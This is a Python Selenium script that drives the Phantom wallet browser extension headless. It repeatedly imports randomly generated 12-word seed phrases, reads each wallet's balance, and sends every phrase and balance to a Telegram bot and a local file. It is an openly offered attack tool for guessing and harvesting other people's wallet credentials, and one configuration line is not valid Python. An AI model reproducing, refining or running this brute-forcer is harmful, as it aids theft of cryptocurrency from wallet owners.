from selenium.webdriver.common.keys import Keys
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import random
import requests
Token = "Your Token"
chatId = #Your chatID#

with open('english.txt', 'r') as file:
    all_words = file.read().splitlines()

RESULT_FILE = 'mnemonic_combinations.txt'
PASSWORD = '11111111'

def enter_mnemonic(driver, mnemonic):
    for word in mnemonic.split():
        driver.switch_to.active_element.send_keys(word)
        for i in range(2):
            driver.find_element(By.CSS_SELECTOR, 'body').send_keys(Keys.TAB)
    #time.sleep(0.5)

def import_wallet(driver, mnemonic, password):
    try:
        driver.find_element('xpath','/html/body/div/main/div[2]/div/div[2]/button[2]').click()  # согласиться с Условиями использования
        for i in range(12):
            input_xpath = f"/html/body/div/main/div[2]/form/div/div[2]/div[{i + 1}]/input"
            driver.find_element('xpath', input_xpath).send_keys(
                mnemonic.split()[i])  # вставить слово в текущее текстовое поле
        driver.find_element('xpath', '/html/body/div/main/div[2]/form/button').click() # confirm
        driver.find_element('xpath', '/html/body/div/main/div[2]/form/button[2]').click() # next
        driver.find_element('xpath', '/html/body/div/main/div[2]/form/div[1]/div[2]/input').send_keys(password) # enter password
        driver.find_element('xpath', '/html/body/div/main/div[2]/form/div[1]/div[2]/div/div/input').send_keys(password) # enter password twice
        driver.find_element('xpath', '/html/body/div/main/div[2]/form/div[2]/span/input').click() # I understand
        driver.find_element('xpath', '/html/body/div/main/div[2]/form/button').click() # import my wallet
        driver.find_element('xpath', '/html/body/div/main/div[2]/form/button').click() # got it
        time.sleep(1)
        driver.execute_script("window.open('chrome-extension://bfnaelmomeimhlpmgjnjophhpkkoljpa/popup.html')")
        driver.switch_to.window(driver.window_handles[2])
        return True
    except:
        print('Error importing wallet')
        return False

def get_balance(driver):
    try:
        balance_element = driver.find_element(By.XPATH, '/html/body/div[1]/div/div/div[1]/div[1]/div/div[1]/div/div[1]/p')
        balance_text = balance_element.text.strip()
        balance = balance_text.replace("USD", "").replace(",", "").strip()
        print("Current Balance:", balance)
        return balance
    except Exception as e:
        print("Error getting balance:", e)
        return None

chrome_options = Options()
chrome_options.add_extension('Phantom_Crhome.crx')
chrome_options.add_argument("--headless=new")

while True:
    driver = webdriver.Chrome(options=chrome_options)
    driver.maximize_window()
    driver.implicitly_wait(10)
    driver.switch_to.window(driver.window_handles[1])

    random_words = random.sample(all_words, 12)
    MNEMONIC = ' '.join(random_words)

    if import_wallet(driver, MNEMONIC, PASSWORD):
        balance = get_balance(driver)
        if balance is not None:
            message = f'{MNEMONIC}: {balance}\n'
            url = f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={chatId}&text={message}"
            print(requests.get(url).json())
            with open(RESULT_FILE, 'a') as result_file:
                result_file.write(f'Phantom: {MNEMONIC} : {balance}\n')  # Записываем MNEMONIC в файл
            print(f'Balance for mnemonic "{MNEMONIC}" saved to file')
    else:
        driver.quit()
        print('Retrying...')
